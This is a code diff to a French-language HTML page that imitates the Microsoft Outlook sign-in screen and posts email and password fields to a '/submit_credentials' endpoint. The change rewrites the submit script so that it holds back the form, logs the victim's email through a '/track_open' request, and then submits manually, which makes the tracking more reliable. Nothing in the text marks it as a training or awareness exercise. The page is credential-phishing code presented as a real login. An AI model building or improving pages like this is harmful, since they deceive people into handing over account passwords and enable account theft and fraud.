@@ -64,7 +64,7 @@
 <body>
     <div class="container">
         <h2>Se connecter à Outlook</h2>
-        <form action="/submit_credentials" method="POST">
+        <form action="/submit_credentials" method="POST" id="loginForm">
             <div class="form-group">
                 <label for="email">Adresse email ou numéro de téléphone</label>
                 <input type="text" id="email" name="email" placeholder="Entrez votre email" required>
@@ -82,19 +82,24 @@
 
     <script>
     document.addEventListener("DOMContentLoaded", function () {
-        let form = document.querySelector("form");
+        let form = document.getElementById("loginForm");
 
-        form.addEventListener("submit", function (event) {
-            let emailInput = document.querySelector("input[name='email']");
+        form.addEventListener("submit", async function (event) {
+            event.preventDefault(); // Empêche la soumission immédiate du formulaire
+            let emailInput = document.getElementById("email");
             
             if (emailInput && emailInput.value.trim() !== "") {
                 let email = encodeURIComponent(emailInput.value);
                 
-                // Effectuer une requête à /track_open AVANT d'envoyer le formulaire
-                fetch(`/track_open?email=${email}`)
-                    .then(response => console.log("Tracking enregistré pour " + email))
-                    .catch(error => console.error("Erreur tracking :", error));
+                try {
+                    await fetch(`/track_open?email=${email}`);
+                    console.log("Tracking enregistré pour " + email);
+                } catch (error) {
+                    console.error("Erreur tracking :", error);
+                }
             }
+            
+            form.submit(); // Soumission manuelle après le tracking
         });
     });
     </script>
